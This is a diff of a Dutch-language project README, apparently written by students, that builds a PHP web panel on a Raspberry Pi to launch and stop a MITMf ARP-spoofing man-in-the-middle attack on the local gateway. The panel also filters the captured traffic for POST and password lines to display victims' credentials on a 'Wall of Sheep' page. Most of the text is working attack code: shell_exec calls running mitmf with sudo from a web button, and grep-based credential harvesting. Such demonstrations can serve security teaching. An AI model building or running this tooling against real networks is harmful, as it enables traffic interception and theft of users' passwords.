@@ -182,22 +182,124 @@ update-rc.d apache2 defaults
 ```
 ###Index.PHP
 
-Als we nu naar de site zouden gaan die op de php server staat is deze leeg. We gaan alles in php schrijven om de aanval vanuit deze pagina te kunnen doen. Dit houd in: een *[START](#START)* knop om de aanval te starten, een *[LOG](#LOG)* knop waar we de log bestanden mee opvragen en een *[STOP](#STOP)* knop om de aanval te stoppen. 
+Als we nu naar de site zouden gaan die op de php server staat is deze leeg. We gaan alles in php schrijven om de aanval vanuit deze pagina te kunnen doen. Dit houd in: een *[START](#START)* knop om de aanval te starten, een *[LOG](#LOG)* knop waar we de log bestanden mee opvragen en een *[STOP](#STOP)* knop om de aanval te stoppen. Tevens laat de pagina ook de status van het programma zien. Hierdoor weet je of het af staat, aan het opstarten is, of al bezig is.
 
-####HTML 
+####HTML & PHP
 
 Knoppen waar we alle functies mee gaan uitvoeren.
+Bevat ook de status van het programma.
+De status van het programma kijken we na door een gefilterde search te doen naar onze draaiende processen op de Rapberry pi.
+Dit word gedaan door de *$return* uit te voeren en de result in en IF-/ELSEIF-statement te gooien.
+Indien deze niets opleveren kunnen we er vanuit gaan dat de service niet aan het draaien is. Indien we een S en R optvangen weten we dat het programma aan het opstarten is. Wanneer het programma volledig is opgestart zullen we een S en Sl ontvangen van de proccess tabel.
 
-```html
-<form method="GET" action =''>
+```
+<form method="POST" action=''>
 <input type = submit name='ARP' value = "Start ARP">
+</form> 
+Status: <?php
+$return = "ps aux | grep '[/]mitmf' | awk '{print $8}'";
+exec($return,$op);
+
+if($op[0] == "S" && $op[1] == "Sl"){ echo "Programm running";}
+elseif($op[0] == "S" && $op[1] == "R"){echo "Programm launching";}
+
+else{echo "service not running";}
+
+?>
+
+</br>
+
+<form method="GET" action=''>
+
 <input type = submit name='LOG' value = "GET LOG">
+</br>
 <input type = submit name='STOP' value = "STOP">
-</form>
+
+</form> 
+
 ```
 
 ####PHP 
 
-VOOR MORGE SCHUP AFGEKUIST
+#####Variabelen
 
+In het programma hebben we enkele variabelen nodig die we op voorhand instellen. Deze zijn onder andere 
+* $filename: locatie koppie van de originele log file van mitmf
+* $mitmffile: locatie van de originele log file van mitmf
+* $stop: commando voor de mitmf aanval te stoppen
 
+```
+$filename = '/var/www/html/logfile.log';
+$mitmffile = '/usr/share/mitmf/logs/mitmf.log';
+$stop = "sudo kill $(ps aux | grep '[m]itmf' | awk '{print $2}')";
+```
+#####START ARP 
+
+Om onze aanval uit te voeren moeten we enkel op de *START ARP* knop duwen. Wanneer dit gebeurd wordt de methode *runhack()* in ons programma aangeroepen. 
+
+```
+if(isset($_POST['ARP']))
+{
+runHack();
+}
+```
+
+Deze methode zal eerst de Raspberry pi zijn default gateway opvragen. Deze is een variabele die we nodig hebben om de aanval te kunnen starten. We steken hem daarom in *$default*.
+```
+function runHack()
+{
+exec('route -n | cut -d" " -f10',$test);
+$default = $test[2];
+```
+Vervolgens gaan we nagaan of er nog een logfile is van voorgaande aanvallen. Omdat deze informatie outdated kan zijn moeten we deze eerst verwijderen.
+```
+if(isset($_POST['ARP']))
+if(file_exists("/usr/share/mitmf/logs/mitmf.log"))
+{
+shell_exec("sudo rm /usr/share/mitmf/logs/mitmf.log");
+}
+```
+Nu alle voorbereidingen getroffen zijn gaan we het commando voor de aanval ingeven. Dit slaan we op in de *$commando* variablele. Hierna gaan we een *shell_exec($command)* uitvoeren om  de aanval te starten. 
+```
+$command = 'sudo mitmf -i eth0 --gateway '.$default.' --spoof --arp';
+shell_exec($command);
+}
+```
+Het $commando bevat het volgende:
+* sudo: toevoegen om www-data als admin te runnen
+* mitmf: service die de aanval uitvoert
+* -i: de interface waar we deze gaan uitvoeren
+* --gateway: de gateway die we gaan overnemen
+* --spoof: alles loggen naar een bestand
+* --arp: type van de aanval die we uitvoeren
+
+Voor de aanval gestart werd zagen onze draaiende proccessen als volgend uit:
+*foto ps aux voor hack*
+Na de start van de aanval zal de status van de pagina veranderen van: *service not running* naar *programm launching*.
+Onze process tabel ziet er dan als volgend uit:
+*foto ps aux na start*
+Omdat we het op een trage Raspberry pi runnen heeft het programma ongeveer 40 seconden nodig om op te starten. Als dit gebeurd is zal status op de pagina veranderen van: *programm launching* naar *programm running*. Onze process tabel ziet er dan als volgend uit:
+*foto ps aux volledig gestart*
+Het programma zal nu all het verkeer dat door de default gateway in het oog houden en wegschrijven naar een logfile.
+
+#####LOG
+Omdat we bij de Wall of sheep enkel de gebruikersnaam/mail en wachtwoorden laten zien (en de website) zullen we de grote logfile waar al het verkeer in terecht komt moeten filteren. Dit gebeurd vanaf het moment dat de gebruiker de files opvraagt aan de server.
+
+```
+if(isset($_GET['LOG']))
+{
+WallofSheep($filename);
+}
+```
+We geven hier de variabele *$filename* aan mee omdat we deze nodig hebben in onze methode.
+Hier gaan we nakijken of we nog een logfile hebben van en vorige keer en deze verwijderen moest dit het geval zijn. Hier op volgend gaan we de originele log file kopieëren en in de huidige map plaatsen. Dit staat ons toe om bewerking op de lokale log file uit te voeren. De lokale logfile wordt gefilterd op de keywords *POST* en *pass*. Dit doen we omdat we hierdoor alle POSTs er uit kunnen halen en alle zinnen met een wachtwoord in. Deze zetten we in een andere file net de naam *pass2.txt* .
+```
+function WallofSheep($filename){
+
+if(file_exists($filename))
+{
+exec("rm logfile.log");
+}
+exec("cp /usr/share/mitmf/logs/mitmf.log logfile.log");
+exec('cat logfile.log | grep "POST\|pass" | tee "pass2.txt"');
+```
